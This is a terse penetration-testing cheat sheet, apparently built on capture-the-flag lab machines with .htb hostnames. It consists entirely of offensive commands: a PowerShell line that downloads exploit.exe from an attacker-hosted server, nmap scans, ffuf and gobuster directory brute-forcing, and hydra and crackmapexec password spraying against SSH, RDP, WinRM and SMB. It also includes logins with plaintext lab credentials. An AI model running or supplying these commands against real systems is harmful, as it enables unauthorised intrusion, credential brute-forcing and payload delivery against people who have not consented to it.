# sheet sheat

```shell
invoc file with powershell after created a python server ( python3 -m http.server) powershell "(new-object System.Net.WebClient).Downloadfile('[http://10.10.14.17:8000/exploit.exe](http://10.10.14.17:8000/exploit.exe)', 'exploit.exe')"

nmap -sC -sV -Pn -oA nmap/bounty 10.10.10.93

nmap -sC -sV -p- -T5 10.129.37.123

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://eforenzics.htb/assets/FUZZ.jpg

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://eforenzics.htb/assets/FUZZ.jpg -mc all -fs 0,16 -c 404


gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://eforenzics.htb/assets/imgs/


gobuster --url [http://10.10.10.93](http://10.10.10.93/)/ dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

gobuster --url [http://10.10.10.93/](http://10.10.10.93/) dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x aspx

netstat -antp | grep -i list


```shell
crackmapexec winrm 10.129.252.193 -u username.list -p password.list

hydra -L username.list  -P password.list -u -f ssh://10.129.252.193:22 -t 4

rdesktop -u john -p november 10.129.252.193

evil-winrm -i 10.129.252.193 -u john -p november

ssh dennis@10.129.252.193 

hydra -L username.list  -P password.list -u -f rdp://10.129.252.193

hydra -L username.list  -P password.list -u -f smb://10.129.252.193

crackmapexec smb 10.129.252.193 -u username.list -p password.list

rdesktop -u chris -p 789456123 10.129.252.193

crackmapexec smb 10.129.42.197 -u "john" -p "november" --shares

smbclient -U john \\\\10.129.252.193\\

crackmapexec smb 10.129.42.197 -u "john" -p "november" --shares

crackmapexec smb 10.129.42.197 -u "john" -p "november"

crackmapexec smb 10.129.42.197 -u "cassie" -p "12345678910" --shares

crackmapexec smb 10.129.42.197 -u "chris" -p "789456123" --shares

crackmapexec smb 10.129.252.193 -u "cassie" -p "12345678910" --shares

smbclient -U cassie \\\\10.129.252.193\\CASSIE
```

```
